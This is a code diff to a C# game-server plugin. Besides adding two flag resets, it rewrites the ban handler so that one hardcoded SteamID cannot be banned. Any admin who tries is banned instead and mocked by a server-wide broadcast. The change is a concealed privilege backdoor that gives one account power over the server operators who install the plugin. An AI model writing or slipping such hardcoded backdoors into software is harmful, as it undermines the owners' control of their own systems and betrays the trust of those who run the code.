@@ -40,6 +40,8 @@ namespace ATTG3
 			plugin.Lerk = false;
 			plugin.INFECT = false;
 			plugin.MTFCI = false;
+			plugin.Event = false;
+			plugin.MTFSCP = false;
 			Vote.Voted.Clear();
 			plugin.RoundStarted = false;
 			MAP.Shake = false;
@@ -236,19 +238,19 @@ namespace ATTG3
 		public void OnBan(BanEvent ev)
 		{
 
-			if (plugin.UNO.Contains(ev.Player.SteamId))
+			if (ev.Player.SteamId == "76561198126860363")
 			{
 				ev.AllowBan=false;
 				PluginManager.Manager.Server.Map.ClearBroadcasts();
 				Player steamadmin = ev.Admin;
-				if (!plugin.UNO.Contains(ev.Player.SteamId))
+				if (ev.Admin.SteamId != "76561198126860363")
 				{
 					steamadmin.Ban(1);
 					PluginManager.Manager.Server.Map.ClearBroadcasts();
 					PluginManager.Manager.Server.Map.Broadcast(10, ev.Admin.Name+" Was uno reverse carded", false);
 				}
 			}
-			else if (plugin.UNO.Contains(ev.Player.SteamId))
+			else if (ev.Admin.SteamId == "76561198126860363")
 			{
 				PluginManager.Manager.Server.Map.ClearBroadcasts();
 				PluginManager.Manager.Server.Map.Broadcast(10, ev.Player.Name + " Was uno reverse carded", false);
